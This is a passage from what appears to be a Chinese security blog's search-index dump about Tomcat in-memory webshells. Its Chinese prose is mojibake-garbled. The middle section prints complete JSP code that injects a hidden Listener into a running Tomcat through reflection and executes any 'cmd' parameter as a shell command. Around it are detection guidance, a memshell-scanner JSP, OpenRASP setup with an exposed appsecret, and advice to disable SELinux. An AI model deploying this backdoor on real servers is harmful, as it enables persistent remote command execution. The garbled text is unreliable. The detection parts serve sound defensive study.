class\u0026lt;/th\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;th width=\\\u0026#34;30%\\\u0026#34;\u0026gt;Listener classLoader\u0026lt;/th\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;th width=\\\u0026#34;35%\\\u0026#34;\u0026gt;Listener class file path\u0026lt;/th\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;th width=\\\u0026#34;5%\\\u0026#34;\u0026gt;dump class\u0026lt;/th\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;th width=\\\u0026#34;5%\\\u0026#34;\u0026gt;kill\u0026lt;/th\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;/thead\u0026gt;\\n\u0026#34; + \u0026#34; \u0026lt;tbody\u0026gt;\u0026#34;); int index = 0; for (ServletRequestListener listener : newListeners) { out.write(\u0026#34;\u0026lt;tr\u0026gt;\u0026#34;); out.write(String.format(\u0026#34;\u0026lt;td style=\\\u0026#34;text-align:center\\\u0026#34;\u0026gt;%d\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;%s\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;%s\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;%s\u0026lt;/td\u0026gt;\u0026lt;td style=\\\u0026#34;text-align:center\\\u0026#34;\u0026gt;\u0026lt;a href=\\\u0026#34;?action=dump\u0026amp;className=%s\\\u0026#34;\u0026gt;dump\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt;\u0026lt;td style=\\\u0026#34;text-align:center\\\u0026#34;\u0026gt;\u0026lt;a href=\\\u0026#34;?action=kill\u0026amp;servletName=%s\\\u0026#34;\u0026gt;kill\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt;\u0026#34; , index + 1 , listener.getClass().getName() , listener.getClass().getClassLoader() , classFileIsExists(listener.getClass()) , listener.getClass().getName() , listener.getClass().getName())); out.write(\u0026#34;\u0026lt;/tr\u0026gt;\u0026#34;); index++; } out.write(\u0026#34;\u0026lt;/tbody\u0026gt;\u0026lt;/table\u0026gt;\u0026#34;); } %\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;br/\u0026gt; code by c0ny1 \u0026lt;/center\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;   å†…å­˜é©¬æ’æŸ¥ å¦‚æœæ˜¯jspæ³¨å…¥ï¼Œæ—¥å¿—ä¸­æ’æŸ¥å¯ç–‘jspçš„è®¿é—®è¯·æ±‚\næ ¹æ®ä¸šåŠ¡ä½¿ç”¨çš„ç»„ä»¶æ’æŸ¥æ˜¯å¦å¯èƒ½å­˜åœ¨javaä»£ç æ‰§è¡Œæ¼æ´ä»¥åŠæ˜¯å¦å­˜åœ¨è¿‡webshellï¼Œæ’æŸ¥æ¡†æ¶æ¼æ´ï¼Œååºåˆ—åŒ–æ¼æ´ã€‚\nå¦‚æœæ˜¯ä»£ç æ‰§è¡Œæ¼æ´ï¼Œæ’æŸ¥ä¸­é—´ä»¶çš„error.logï¼ŒæŸ¥çœ‹æ˜¯å¦æœ‰å¯ç–‘çš„æŠ¥é”™ï¼Œåˆ¤æ–­æ³¨å…¥æ—¶é—´å’Œæ–¹æ³•\nå¦‚æœæ˜¯servletæˆ–è€…springçš„controllerç±»å‹ï¼Œæ ¹æ®ä¸ŠæŠ¥çš„webshellçš„urlæŸ¥æ‰¾æ—¥å¿—ï¼ˆæ—¥å¿—å¯èƒ½è¢«å…³é—­ï¼Œä¸ä¸€å®šæœ‰ï¼‰ï¼Œæ ¹æ®urlæœ€æ—©è®¿é—®æ—¶é—´ç¡®å®šè¢«æ³¨å…¥æ—¶é—´ã€‚\nå¦‚æœæ˜¯filteræˆ–è€…listenerç±»å‹ï¼Œå¯èƒ½ä¼šæœ‰è¾ƒå¤šçš„404ä½†æ˜¯å¸¦æœ‰å‚æ•°çš„è¯·æ±‚ï¼Œæˆ–è€…å¤§é‡è¯·æ±‚ä¸åŒurlä½†å¸¦æœ‰ç›¸åŒçš„å‚æ•°ï¼Œæˆ–è€…é¡µé¢å¹¶ä¸å­˜åœ¨ä½†è¿”å›200\nArthas æ’æŸ¥ 1 2 3  java -jar arthas-boot.jar sc *servlet jad --source-only com.example.xxx   æ•´ä½“æ¼”ç¤º \u0026ldquo;http://{ip}:{port}/{waråŒ…åç§°}/{è®¿é—®çš„é»˜è®¤é¦–é¡µ}\u0026rdquo;\næ‰“åŒ…éƒ¨ç½²åˆ°Tomcat Centoså®‰è£…Tomcat 1 2  yum -y install tomcat systemctl start/stop/status tomcat    å®‰è£…è·¯å¾„ï¼š /usr/share/tomcat é…ç½®è·¯å¾„:ï¼š/etc/tomcat/ æ’é”™æ—¥å¿—ï¼š /usr/share/tomcat/logs/catalina.*.log  éƒ¨ç½²waråŒ… ä¸Šä¼ waråŒ…åˆ°/usr/share/tomcat/webapps\n1  scp TomcatServletShell-1.0-SNAPSHOT.war rasp:/usr/share/tomcat/webapps   é…ç½®openrasp æ–‡ç« çš„éƒ¨åˆ†å†…å®¹è¢«å¯†ç ä¿æŠ¤ï¼š\n  --- DON'T MODIFY THIS LINE ---  ä¸‹è½½Java Agentå®‰è£…åŒ…  1 2 3  curl https://packages.baidu.com/app/openrasp/release/1.3.7/rasp-java.tar.gz -o rasp-java.tar.gz tar -xvf rasp-java.tar.gz cd rasp-*/   æ‰§è¡ŒRaspInstallè¿›è¡Œå®‰è£…\nè¯·å…ˆæ›¿æ¢ /path/to/tomcat ä¸ºä½ çš„æœåŠ¡å™¨è·¯å¾„ï¼Œå†æ‰§è¡Œå‘½ä»¤å®‰è£…  1  java -jar RaspInstall.jar -heartbeat 90 -appid 6e009cc2caf116635581b17a7872a88940ed2b70 -appsecret qLAra0wyLZGabX9KrBry7bR0goHiStXTz910Q5vbNoa -backendurl http://127.0.0.1:8086/ -install /usr/share/tomcat/   é‡å¯ Tomcat/JBoss/WebLogic/SpringBoot åº”ç”¨æœåŠ¡å™¨  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  systemctl restart tomcat systemctl status tomcat â— tomcat.service - Apache Tomcat Web Application Container Loaded: loaded (/usr/lib/systemd/system/tomcat.service; disabled; vendor preset: disabled) Active: active (running) since Wed 2022-07-20 10:43:42 UTC; 40s ago Main PID: 16583 (java) Tasks: 42 Memory: 109.8M CGroup: /system.slice/tomcat.service â””â”€16583 /usr/lib/jvm/jre/bin/java -javaagent:/usr/share/tomcat/rasp/rasp.jar -javaagent:/usr/share/tomcat/rasp/rasp.jar -classpath /usr/share/tomcat/bin/bootstrap.jar:/us... Jul 20 10:43:43 ip-172-31-32-181.ap-northeast-1.compute.internal server[16583]: Jul 20, 2022 10:43:43 AM org.apache.catalina.core.StandardService startInternal Jul 20 10:43:43 ip-172-31-32-181.ap-northeast-1.compute.internal server[16583]: INFO: Starting service Catalina Jul 20 10:43:43 ip-172-31-32-181.ap-northeast-1.compute.internal server[16583]: Jul 20, 2022 10:43:43 AM org.apache.catalina.core.StandardEngine startInternal Jul 20 10:43:43 ip-172-31-32-181.ap-northeast-1.compute.internal server[16583]: INFO: Starting Servlet Engine: Apache Tomcat/7.0.76 Jul 20 10:43:43 ip-172-31-32-181.ap-northeast-1.compute.internal server[16583]: Jul 20, 2022 10:43:43 AM org.apache.coyote.AbstractProtocol start Jul 20 10:43:43 ip-172-31-32-181.ap-northeast-1.compute.internal server[16583]: INFO: Starting ProtocolHandler [\u0026#34;http-bio-8080\u0026#34;] Jul 20 10:43:43 ip-172-31-32-181.ap-northeast-1.compute.internal server[16583]: Jul 20, 2022 10:43:43 AM org.apache.coyote.AbstractProtocol start Jul 20 10:43:43 ip-172-31-32-181.ap-northeast-1.compute.internal server[16583]: INFO: Starting ProtocolHandler [\u0026#34;ajp-bio-8009\u0026#34;] Jul 20 10:43:43 ip-172-31-32-181.ap-northeast-1.compute.internal server[16583]: Jul 20, 2022 10:43:43 AM org.apache.catalina.startup.Catalina start Jul 20 10:43:43 ip-172-31-32-181.ap-northeast-1.compute.internal server[16583]: INFO: Server startup in 41 ms   æ’é”™\næŸ¥çœ‹ /usr/share/tomcat/logs/catalina.2022-07-20.logå‘ç°å¦‚ä¸‹é”™è¯¯ï¼š  java.lang.UnsatisfiedLinkError: /var/cache/tomcat/temp/nativelib-loader_4485267645656510327/Classloader.1658314629304.0/libopenrasp_v8_java.so: /var/cache/tomcat/temp/nativelib-loader_4485267645656510327/Classloader.1658314629304.0/libopenrasp_v8_java.so: failed to map segment from shared object: Permission denied\né—®äº†@c0de::bre@k å¤§ä½¬ï¼Œæ˜¯å¼€å¯SElinuxçš„åŸå› \n1  /usr/sbin/sestatus -v # æŸ¥çœ‹selinuxçŠ¶æ€   æ¥ä¸‹æ¥éœ€è¦å…³é—­SELinuxå†…æ ¸ï¼Œæ‰“å¼€selinuxé…ç½®æ–‡ä»¶ï¼Œ\ncd /etc/selinux/config\næ‰“å¼€configé…ç½®æ–‡ä»¶ä»¥åï¼Œæ‰¾åˆ°SELINUX=enforcingï¼Œå°†å…¶æ”¹ä¸ºSELINUX=disabled , é‡å¯\nå‚è€ƒ JavaFilterå‹å†…å­˜é©¬çš„å­¦ä¹ ä¸å®è·µ\nä»¥åˆå­¦è€…è§’åº¦è°ƒè¯•filterå†…å­˜é©¬\n ","description":"","id":29,"section":"dso","tags":null,"title":"Tomcatçš„Filterå‹å†…å­˜é©¬ç ”ç©¶","uri":"http://crkmythical.github.io/dso/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/tomcat%E7%9A%84filter%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC%E7%A0%94%E7%A9%B6/"},{"content":"Beijing: â˜€ï¸ ğŸŒ¡ï¸+31Â°C ğŸŒ¬ï¸â†–11km/h\nç›®å‰Javaå†…å­˜é©¬çš„å…¨æµç¨‹å·²ç»æœ‰å®Œå–„çš„è§£å†³æ–¹æ¡ˆäº†ï¼š\n ç¬¬ä¸€æ­¥ï¼Œè·å–å½“å‰è¯·æ±‚çš„HttpRequestå¯¹è±¡æˆ–tomcatçš„StandardContextå¯¹è±¡(Weblogicä¸‹æ˜¯ServletContextå¯¹è±¡)ï¼ŒSpringMVCå’ŒSpringBootä¸‹æ³¨å…¥controllerå’Œinterceptoråˆ™æ˜¯è·å–åˆ°WebApplicationContextå¯¹è±¡ã€‚ ç¬¬äºŒæ­¥ï¼Œåˆ›å»ºservletã€filteræˆ–controllerç­‰æ¶æ„å¯¹è±¡ ç¬¬ä¸‰æ­¥ï¼Œä½¿ç”¨å„ç±»contextå¯¹è±¡çš„å„ç§æ–¹æ³•ï¼Œå‘ä¸­é—´ä»¶æˆ–æ¡†æ¶åŠ¨æ€æ·»åŠ servletã€filteræˆ–controllerç­‰æ¶æ„å¯¹è±¡ï¼Œå®Œæˆå†…å­˜é©¬çš„æ³¨å…¥  å‘å„ç§ä¸­é—´ä»¶å’Œæ¡†æ¶æ³¨å…¥å†…å­˜é©¬çš„åŸºç¡€ï¼Œå°±æ˜¯è¦è·å¾—contextï¼Œæ‰€è°“contextå®é™…ä¸Šå°±æ˜¯æ‹¥æœ‰å½“å‰ä¸­é—´ä»¶æˆ–æ¡†æ¶å¤„ç†è¯·æ±‚ã€ä¿å­˜å’Œæ§åˆ¶servletå¯¹è±¡ã€ä¿å­˜å’Œæ§åˆ¶filterå¯¹è±¡ç­‰åŠŸèƒ½çš„å¯¹è±¡ã€‚\nä½¿ç”¨æ–°å¢servletçš„æ–¹å¼å°±éœ€è¦ç»‘å®šæŒ‡å®šçš„URLï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦æ›´åŠ éšè”½ï¼Œåšåˆ°å†…å­˜é©¬ä¸URLæ— å…³ï¼Œ\né‚£å°±å¾—é€šè¿‡æ³¨å…¥æ–°çš„æˆ–ä¿®æ”¹å·²æœ‰çš„filteræˆ–è€…listenerçš„æ–¹å¼æ¥å®ç°äº†ã€‚\nTomcatçš„Linstenerå‹å†…å­˜é©¬ç ”ç©¶ Linstenerå‹å†…å­˜é©¬çš„æ€»ä½“æ€è·¯æ˜¯ï¼š\n åˆ›å»ºä¸€ä¸ªæ¶æ„ç±»ListenerShellï¼Œç»§æ‰¿ServletRequestListenerç±»ï¼Œé‡å†™public void requestInitialized(ServletRequestEvent sre)æ–¹æ³• é€šè¿‡åå°„è·å–ApplicationContext, ç„¶åå†é€šè¿‡åå°„è·å–StandardContextå¯¹è±¡ è°ƒç”¨StandardContext#addApplicationEventListeneræ–¹æ³•å°†ListenerShellæ·»åŠ è¿›å»  åˆ›å»ºæ¶æ„ç±»ListenerShell 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  \u0026lt;% class ListenerShell implements ServletRequestListener { @Override public void requestDestroyed(ServletRequestEvent sre) { ServletRequestListener.super.requestDestroyed(sre); System.out.println(\u0026#34;é”€æ¯ã€‚ã€‚ã€‚\u0026#34;); } @Override public void requestInitialized(ServletRequestEvent sre) { ServletRequestListener.super.requestInitialized(sre); System.out.println(\u0026#34;åˆå§‹åŒ–ã€‚ã€‚ã€‚\u0026#34;); if ( sre.getServletRequest().getParameter(\u0026#34;cmd\u0026#34;) != null ){ boolean isWin = System.getProperty(\u0026#34;os.name\u0026#34;).toLowerCase().contains(\u0026#34;win\u0026#34;); String[] cmds = isWin ? new String[]{\u0026#34;cmd.exe\u0026#34;,\u0026#34;/c\u0026#34;, sre.getServletRequest().getParameter(\u0026#34;cmd\u0026#34;)} : new String[]{\u0026#34;sh\u0026#34;,\u0026#34;-c\u0026#34;,sre.getServletRequest().getParameter(\u0026#34;cmd\u0026#34;)}; Scanner scanner = null; try { scanner = new Scanner(Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); } catch (IOException e) { throw new RuntimeException(e); } String result = scanner.hasNext() ? scanner.next() : \u0026#34;\u0026#34;; System.out.println(result); } } } %\u0026gt;   é€šè¿‡åå°„è·å–StandardContextå¯¹è±¡ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  \u0026lt;% // è·å–servletContext, å› ä¸ºservletContextæ˜¯æ¥å£ç±»ï¼Œæ‰€ä»¥è·å–çš„æ˜¯å®ƒå­å®ç°ç±»ApplicationContextFacade  ServletContext servletContext = request.getSession().getServletContext(); // é€šè¿‡åå°„è·å–ApplicationContextFacadeçš„ç§æœ‰å±æ€§contextå­—æ®µ,ç±»å‹ApplicationContext  Field appctx_context = servletContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); // è®¾ç½®appctx ç¦æ­¢Javaè¯­è¨€è®¿é—®æ£€æŸ¥  appctx_context.setAccessible(true); // é€šè¿‡åå°„è·å–å­—æ®µå€¼ - è·å–å­—æ®µappctx_context åœ¨servletContextå¯¹è±¡ä¸Šçš„å€¼ï¼Œå¹¶å¼ºåˆ¶ç±»å‹è½¬æ¢ApplicationContext  ApplicationContext applicationContext = (ApplicationContext) appctx_context.get(servletContext); // é€šè¿‡åå°„è·å–ApplicationContextçš„ç§æœ‰å±æ€§contextå­—æ®µï¼Œç±»å‹æ˜¯StandardContext  Field stdctx_context = applicationContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); // è®¾ç½®stdctx_context ç¦æ­¢Javaè¯­è¨€è®¿é—®æ£€æŸ¥  stdctx_context.setAccessible(true); // é€šè¿‡åå°„è·å– stdctx_context å­—æ®µåœ¨ applicationContextç±»ä¸Šå¯¹åº”çš„å€¼ï¼Œç±»å‹ä¸ºObjectï¼Œå¹¶å¼ºåˆ¶è½¬æ¢ä¸ºStandardContext  StandardContext standardContext =(StandardContext) stdctx_context.get(applicationContext); %\u0026gt;   è°ƒç”¨StandardContext#addApplicationEventListeneræ–¹æ³•å°†ListenerShellæ·»åŠ è¿›å» 1 2 3 4 5  \u0026lt;% ListenerShell servletRequestListener = new ListenerShell(); standardContext.addApplicationEventListener(servletRequestListener); out.println(\u0026#34;inject success\u0026#34;); %\u0026gt;   å®Œæ•´ä»£ç  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77  \u0026lt;%@ page import=\u0026#34;java.util.Scanner\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.io.IOException\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.lang.reflect.Field\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.core.ApplicationContext\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.core.StandardContext\u0026#34; %\u0026gt; \u0026lt;%-- Created by IntelliJ IDEA. User: ding.fugui Date: 7/22/22 Time: 15:50 To change this template use File | Settings | File Templates. --%\u0026gt; \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Listener Shell\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;% class ListenerShell implements ServletRequestListener { @Override public void requestDestroyed(ServletRequestEvent sre) { ServletRequestListener.super.requestDestroyed(sre); System.out.println(\u0026#34;é”€æ¯ã€‚ã€‚ã€‚\u0026#34;); } @Override public void requestInitialized(ServletRequestEvent sre) { ServletRequestListener.super.requestInitialized(sre); System.out.println(\u0026#34;åˆå§‹åŒ–ã€‚ã€‚ã€‚\u0026#34;); if ( sre.getServletRequest().getParameter(\u0026#34;cmd\u0026#34;) != null ){ boolean isWin = System.getProperty(\u0026#34;os.name\u0026#34;).toLowerCase().contains(\u0026#34;win\u0026#34;); String[] cmds = isWin ? new String[]{\u0026#34;cmd.exe\u0026#34;,\u0026#34;/c\u0026#34;, sre.getServletRequest().getParameter(\u0026#34;cmd\u0026#34;)} : new String[]{\u0026#34;sh\u0026#34;,\u0026#34;-c\u0026#34;,sre.getServletRequest().getParameter(\u0026#34;cmd\u0026#34;)}; Scanner scanner = null; try { scanner = new Scanner(Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); } catch (IOException e) { throw new RuntimeException(e); } String result = scanner.hasNext() ? scanner.next() : \u0026#34;\u0026#34;; System.out.println(result); } } } %\u0026gt; \u0026lt;% // è·å–servletContext, å› ä¸ºservletContextæ˜¯æ¥å£ç±»ï¼Œæ‰€ä»¥è·å–çš„æ˜¯å®ƒå­å®ç°ç±»ApplicationContextFacade  ServletContext servletContext = request.getSession().getServletContext(); // é€šè¿‡åå°„è·å–ApplicationContextFacadeçš„ç§æœ‰å±æ€§contextå­—æ®µ,ç±»å‹ApplicationContext  Field appctx_context = servletContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); // è®¾ç½®appctx ç¦æ­¢Javaè¯­è¨€è®¿é—®æ£€æŸ¥  appctx_context.setAccessible(true); // é€šè¿‡åå°„è·å–å­—æ®µå€¼ - è·å–å­—æ®µappctx_context åœ¨servletContextå¯¹è±¡ä¸Šçš„å€¼ï¼Œå¹¶å¼ºåˆ¶ç±»å‹è½¬æ¢ApplicationContext  ApplicationContext applicationContext = (ApplicationContext) appctx_context.get(servletContext); // é€šè¿‡åå°„è·å–ApplicationContextçš„ç§æœ‰å±æ€§contextå­—æ®µï¼Œç±»å‹æ˜¯StandardContext  Field stdctx_context = applicationContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); // è®¾ç½®stdctx_context ç¦æ­¢Javaè¯­è¨€è®¿é—®æ£€æŸ¥  stdctx_context.setAccessible(true); // é€šè¿‡åå°„è·å– stdctx_context å­—æ®µåœ¨ applicationContextç±»ä¸Šå¯¹åº”çš„å€¼ï¼Œç±»å‹ä¸ºObjectï¼Œå¹¶å¼ºåˆ¶è½¬æ¢ä¸ºStandardContext  StandardContext standardContext =(StandardContext) stdctx_context.get(applicationContext); ListenerShell servletRequestListener = new ListenerShell(); standardContext.addApplicationEventListener(servletRequestListener); out.println(\u0026#34;inject success\u0026#34;); %\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;   å†…å­˜é©¬æ£€æµ‹ä¸æ’æŸ¥ æºç æ£€æµ‹ åœ¨Javaä¸­ï¼Œåªæœ‰è¢«JVMåŠ è½½/æˆ–åœ¨éœ€è¦æ—¶é€šè¿‡åå°„é€šçŸ¥JVMåŠ è½½çš„ç±»æ‰èƒ½è¢«è°ƒç”¨ã€‚æ‰€æœ‰çš„ç‰¹å¾éƒ½åœ¨å†…å­˜ä¸­ï¼Œè¡¨ç°å½¢å¼ä¸ºè¢«åŠ è½½çš„classï¼Œéœ€è¦é€šè¿‡æŸç§æ–¹æ³•è·å–åˆ°JVMè¿è¡Œæ—¶å†…å­˜ä¸­å·²åŠ è½½çš„ç±»ã€‚\nJavaæœ¬èº«æä¾›äº†Instrumentationç±»æ¥å®ç°\nå®ç°æ€è·¯ï¼š\n æ³¨å…¥jaråŒ… \u0026ndash;\u0026gt;dumpå·²åŠ è½½classå­—èŠ‚ç  \u0026ndash;\u0026gt; åç¼–è¯‘æˆjavaä»£ç  \u0026ndash;\u0026gt; æºç webshellæ£€æµ‹\n æ£€æµ‹åˆ¤å®šï¼š\n æ–°å¢æˆ–ä¿®æ”¹çš„ç±» æ²¡æœ‰å¯¹åº”classæ–‡ä»¶çš„ç±» xmlé…ç½®ä¸­æ²¡æœ‰æ³¨å†Œçš„ å†°èç­‰å¸¸è§å·¥å…·ä½¿ç”¨çš„ç±» filterchainä¸­æ’ç¬¬ä¸€çš„filterç±»  æœ‰ä¸€äº›å·¥å…·å¯ä»¥è¾…åŠ©æ£€æµ‹å†…å­˜é©¬ï¼Œå¦‚java-memshell-scanneræ˜¯é€šè¿‡jspæ‰«æåº”ç”¨ä¸­æ‰€æœ‰çš„filterå’Œservletï¼Œç„¶åé€šè¿‡åç§°ã€å¯¹åº”çš„classæ˜¯å¦å­˜åœ¨æ¥åˆ¤æ–­æ˜¯å¦æ˜¯å†…å­˜é©¬ã€‚\nå†…å­˜é©¬æ£€æµ‹java-memshell-scanner åˆ›å»ºmemshell-scanner.jsp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 278 279 280 281 282 283 284 285 286 287 288 289 290 291 292 293 294 295 296 297 298 299 300 301 302 303 304 305 306 307 308 309 310 311 312 313 314 315 316 317 318 319 320 321 322 323 324 325 326 327 328 329 330 331 332 333 334 335 336 337 338 339 340 341 342 343 344 345 346 347 348 349 350 351 352 353 354 355 356 357 358 359 360 361 362 363 364 365 366 367 368 369 370 371 372 373 374 375 376  \u0026lt;%-- Created by IntelliJ IDEA. User: ding.fugui Date: 7/20/22 Time: 14:35 To change this template use File | Settings | File Templates. --%\u0026gt; \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.net.URL\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.lang.reflect.Field\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.util.HashMap\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;com.sun.org.apache.bcel.internal.Repository\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.net.URLEncoder\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.util.Map\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.core.StandardWrapper\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.lang.reflect.Method\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.util.ArrayList\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.util.List\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.util.concurrent.CopyOnWriteArrayList\u0026#34; %\u0026gt; \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;tomcat-memshell-killer\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;center\u0026gt; \u0026lt;div\u0026gt; \u0026lt;%! public Object getStandardContext(HttpServletRequest request) throws NoSuchFieldException, IllegalAccessException { Object context = request.getSession().getServletContext(); Field _context = context.getClass().getDeclaredField(\u0026#34;context\u0026#34;); _context.setAccessible(true); Object appContext = _context.get(context); Field __context = appContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); __context.setAccessible(true); Object standardContext = __context.get(appContext); return standardContext; } public HashMap\u0026lt;String, Object\u0026gt; getFilterConfig(HttpServletRequest request) throws Exception { Object standardContext = getStandardContext(request); Field _filterConfigs = standardContext.getClass().getDeclaredField(\u0026#34;filterConfigs\u0026#34;); _filterConfigs.setAccessible(true); HashMap\u0026lt;String, Object\u0026gt; filterConfigs = (HashMap\u0026lt;String, Object\u0026gt;) _filterConfigs.get(standardContext); return filterConfigs; } // FilterMap[]  public Object[] getFilterMaps(HttpServletRequest request) throws Exception { Object standardContext = getStandardContext(request); Field _filterMaps = standardContext.getClass().getDeclaredField(\u0026#34;filterMaps\u0026#34;); _filterMaps.setAccessible(true); Object filterMaps = _filterMaps.get(standardContext); Object[] filterArray = null; try { // tomcat 789  Field _array = filterMaps.getClass().getDeclaredField(\u0026#34;array\u0026#34;); _array.setAccessible(true); filterArray = (Object[]) _array.get(filterMaps); } catch (Exception e) { // tomcat 6  filterArray = (Object[]) filterMaps; } return filterArray; } /** * é—ç•™é—®é¢˜,getFilterConfig()ä¾ç„¶å­˜åœ¨2ä¸ª * @param request * @param filterName * @throws Exception */ public synchronized void deleteFilter(HttpServletRequest request, String filterName) throws Exception { Object standardContext = getStandardContext(request); // org.apache.catalina.core.StandardContext#removeFilterDef  HashMap\u0026lt;String, Object\u0026gt; filterConfig = getFilterConfig(request); Object appFilterConfig = filterConfig.get(filterName); Field _filterDef = appFilterConfig.getClass().getDeclaredField(\u0026#34;filterDef\u0026#34;); _filterDef.setAccessible(true); Object filterDef = _filterDef.get(appFilterConfig); Class clsFilterDef = null; try { // Tomcat 8  clsFilterDef = Class.forName(\u0026#34;org.apache.tomcat.util.descriptor.web.FilterDef\u0026#34;); } catch (Exception e) { // Tomcat 7  clsFilterDef = Class.forName(\u0026#34;org.apache.catalina.deploy.FilterDef\u0026#34;); } Method removeFilterDef = standardContext.getClass().getDeclaredMethod(\u0026#34;removeFilterDef\u0026#34;, new Class[]{clsFilterDef}); removeFilterDef.setAccessible(true); removeFilterDef.invoke(standardContext, filterDef); // org.apache.catalina.core.StandardContext#removeFilterMap  Class clsFilterMap = null; try { // Tomcat 8  clsFilterMap = Class.forName(\u0026#34;org.apache.tomcat.util.descriptor.web.FilterMap\u0026#34;); } catch (Exception e) { // Tomcat 7  clsFilterMap = Class.forName(\u0026#34;org.apache.catalina.deploy.FilterMap\u0026#34;); } Object[] filterMaps = getFilterMaps(request); for (Object filterMap : filterMaps) { Field _filterName = filterMap.getClass().getDeclaredField(\u0026#34;filterName\u0026#34;); _filterName.setAccessible(true); String filterName0 = (String) _filterName.get(filterMap); if (filterName0.equals(filterName)) { Method removeFilterMap = standardContext.getClass().getDeclaredMethod(\u0026#34;removeFilterMap\u0026#34;, new Class[]{clsFilterMap}); removeFilterDef.setAccessible(true); removeFilterMap.invoke(standardContext, filterMap); } } } public synchronized void deleteServlet(HttpServletRequest request, String servletName) throws Exception { HashMap\u0026lt;String, Object\u0026gt; childs = getChildren(request); Object objChild = childs.get(servletName); String urlPattern = null; HashMap\u0026lt;String, String\u0026gt; servletMaps = getServletMaps(request); for (Map.Entry\u0026lt;String, String\u0026gt; servletMap : servletMaps.entrySet()) { if (servletMap.getValue().equals(servletName)) { urlPattern = servletMap.getKey(); break; } } if (urlPattern != null) { // åå°„è°ƒç”¨ org.apache.catalina.core.StandardContext#removeServletMapping  Object standardContext = getStandardContext(request); Method removeServletMapping = standardContext.getClass().getDeclaredMethod(\u0026#34;removeServletMapping\u0026#34;, new Class[]{String.class}); removeServletMapping.setAccessible(true); removeServletMapping.invoke(standardContext, urlPattern); // Tomcat 6å¿…é¡»removeChild 789å¯ä»¥ä¸ç”¨  // åå°„è°ƒç”¨ org.apache.catalina.core.StandardContext#removeChild  Method removeChild = 